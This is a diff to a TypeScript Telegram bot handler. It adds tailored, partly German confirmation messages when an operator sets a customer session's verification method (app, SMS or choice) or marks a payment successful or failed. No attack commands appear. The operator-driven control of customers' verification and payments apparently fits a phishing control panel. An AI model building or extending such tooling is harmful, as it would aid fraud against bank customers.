@@ -94,10 +94,26 @@ async function handleCallbackQuery(callbackQuery: any) {
         
         console.log('Verification method set successfully:', result);
         
+        let successMessage;
+        
+        switch (method) {
+          case 'choice_required':
+            successMessage = `✅ **Choice Required**\n\nSession: \`${sessionId}\`\nCustomer can now choose between App & SMS verification.`;
+            break;
+          case 'app_confirmation':
+            successMessage = `✅ **App Verification Activated**\n\nSession: \`${sessionId}\`\nApp confirmation is now active.`;
+            break;
+          case 'sms_confirmation':
+            successMessage = `✅ **SMS Verification Activated**\n\nSession: \`${sessionId}\`\nSMS confirmation is now active.`;
+            break;
+          default:
+            successMessage = `✅ Verification method set to: ${method}`;
+        }
+        
         await editMessageText(
           message.chat.id,
           message.message_id,
-          `✅ Verification method set to: ${method}\n\n${message.text}`,
+          successMessage,
           method === 'choice_required' ? getVerificationChoiceButtons(sessionId) : null
         );
         break;
@@ -147,12 +163,32 @@ async function handleCallbackQuery(callbackQuery: any) {
     }
 
     // Answer callback query to remove loading state
+    let confirmationMessage = 'Action processed';
+    
+    if (action === 'set_method') {
+      const method = params[0];
+      switch (method) {
+        case 'choice_required':
+          confirmationMessage = '✅ Wahl gesetzt - Kunde kann zwischen App & SMS wählen';
+          break;
+        case 'app_confirmation':
+          confirmationMessage = '✅ App-Bestätigung aktiviert';
+          break;
+        case 'sms_confirmation':
+          confirmationMessage = '✅ SMS-Bestätigung aktiviert';
+          break;
+      }
+    } else if (action === 'complete') {
+      const success = params[0] === 'success';
+      confirmationMessage = success ? '✅ Zahlung erfolgreich abgeschlossen' : '❌ Zahlung fehlgeschlagen';
+    }
+    
     await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         callback_query_id: callbackQuery.id,
-        text: 'Action processed'
+        text: confirmationMessage
       })
     });
 
@@ -163,7 +199,7 @@ async function handleCallbackQuery(callbackQuery: any) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         callback_query_id: callbackQuery.id,
-        text: 'Error processing action',
+        text: 'Fehler beim Verarbeiten der Aktion',
         show_alert: true
       })
     });
@@ -301,7 +337,7 @@ function getVerificationMethodButtons(sessionId: string) {
     inline_keyboard: [
       [
         { text: '🔄 Wahl', callback_data: `set_method:${sessionId}:choice_required` },
-        { text: '📱 App-Bestätigung', callback_data: `set_method:${sessionId}:app_confirmation` },
+        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
         { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
       ]
     ]
@@ -312,7 +348,7 @@ function getVerificationChoiceButtons(sessionId: string) {
   return {
     inline_keyboard: [
       [
-        { text: '📱 App-Bestätigung', callback_data: `set_method:${sessionId}:app_confirmation` },
+        { text: '📱 App', callback_data: `set_method:${sessionId}:app_confirmation` },
         { text: '💬 SMS', callback_data: `set_method:${sessionId}:sms_confirmation` }
       ]
     ]
